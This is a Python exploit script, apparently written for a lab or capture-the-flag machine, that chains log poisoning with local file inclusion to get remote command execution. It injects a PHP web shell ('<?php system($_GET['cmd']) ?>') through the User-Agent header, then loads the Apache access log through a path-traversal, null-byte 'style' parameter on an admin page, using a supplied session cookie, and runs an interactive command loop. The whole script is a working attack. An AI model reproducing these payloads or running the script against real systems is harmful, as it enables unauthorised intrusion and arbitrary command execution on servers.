import requests
import urllib
import shlex
import sys
import traceback


# 192.168.56.102 - - [20/Jan/2024:16:39:37 +0100] "GET /skins/shinra/skins/glossy/glossy-bottom.png HTTP/1.1" 200 1586 "http://ftp.cybox.company/skins/shinra/skins/glossy/style.css" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"

# 192.168.56.102 - - [23/Jan/2024:07:34:49 +0100] "GET / HTTP/1.1" 200 5295 "-" "PING 192.168.56.102 (192.168.56.102)

def parse_log_output(output, entry_ip_source):
	ip_index = output.rfind( entry_ip_source )
	if ip_index < 0:
		print("[!] ", entry_ip_source, "'s log entry not found.")
		sys.exit()
		
	filtered_output = ( output[ip_index:].split() )[11:]
	filtered_output = " ".join( filtered_output )
	
	print( filtered_output.replace(r"\n", "\n") )
	
def safe_read(option, args, required, is_bool_option):
	valid_options = ["-lhost", "-r", "--admin-phpsessid"]
	
	for item in args:
		if args.index(item) == len(args)-1 and not is_bool_option:
			print("[!] Insufficient args provided.")
			sys.exit()
			  
		if item == option and not is_bool_option:
			opt_value = args[ args.index(item)+1 ]
			if opt_value in valid_options:
				print("[!] Invalid value ", opt_value, " for option ", item)
				sys.exit()

			return opt_value
			
		if item == option and is_bool_option:
			return True
	
	if required:
		print("[!] Option ", option, " expected, but not found.")
		sys.exit()
	
	return None # Falsed

try:
	inject_ua_re = requests.get("http://ftp.cybox.company/", headers= {"User-Agent":"<?php system($_GET['cmd']) ?>"})
	if inject_ua_re.status_code != 200:
		print("[!] User-Ajent injection failed.")
		sys.exit()
		
	print("[i] User-Agent header injected.")
	print("[i] Proceeding to RCE.\n")
		
	session_id = safe_read("--admin-phpsessid", sys.argv, True, False)
	lhost = safe_read("-lhost", sys.argv, True, False)
	display_raw = safe_read("-r", sys.argv, False, True)
	while True: 
		cmd = input("cmd~: ")
		if not cmd.strip():
			continue

		payload = urllib.parse.urlencode({
			"style": "../../../../../../../opt/bitnami/apache2/logs/access_log%00",
			"cmd" : cmd
		}, 
		safe="%")

		cmd_re = requests.get("http://monitor.cybox.company/admin/styles.php", params= payload, headers= {"Cookie": f"PHPSESSID={session_id}"})

		if cmd_re.status_code==200:
			print("[i] Request: ", cmd_re.url, "\n")
			
			log_output = str( cmd_re.content )
			
			if not display_raw:
				parse_log_output( log_output, lhost )
			else:
				print(log_output)
		else:
			print("[!] RCE failed.")

except KeyboardInterrupt:
	print("\n[i] Bye bye!")

except Exception:
	print("\n[!] Unexpected error.")
	traceback.print_exc()
